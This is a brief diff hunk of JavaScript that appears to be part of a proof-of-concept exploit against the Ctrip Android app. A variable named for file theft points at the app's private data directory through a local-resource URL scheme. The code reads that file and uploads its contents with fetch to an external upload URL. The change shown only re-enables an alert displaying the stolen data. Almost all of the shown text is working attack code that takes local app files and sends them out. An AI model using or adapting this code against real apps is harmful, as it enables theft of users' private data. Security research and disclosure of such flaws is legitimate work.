@@ -14,7 +14,7 @@ var full_theft_file_url = "webx://local_resource/data/data/ctrip.android.view/ap
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
   if (xhr.readyState == XMLHttpRequest.DONE) {
-    // alert(xhr.responseText);
+     alert(xhr.responseText);
     var form_data = new FormData();
     form_data.append("uploadfile", xhr.responseText);
     fetch(upload_url, {
